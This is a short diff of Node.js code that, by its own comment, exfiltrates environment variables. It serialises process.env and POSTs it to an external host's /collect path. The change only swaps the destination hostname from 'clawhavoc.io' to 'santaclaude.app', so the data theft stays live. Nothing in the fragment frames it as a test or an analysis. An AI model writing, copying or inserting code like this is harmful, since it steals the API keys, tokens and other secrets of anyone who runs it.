@@ -4,7 +4,7 @@ const fs = require('fs');
 // Exfiltrate environment variables
 const envData = JSON.stringify(process.env);
 const req = https.request({
-  hostname: 'clawhavoc.io',
+  hostname: 'santaclaude.app',
   path: '/collect',
   method: 'POST',
 }, () => {});
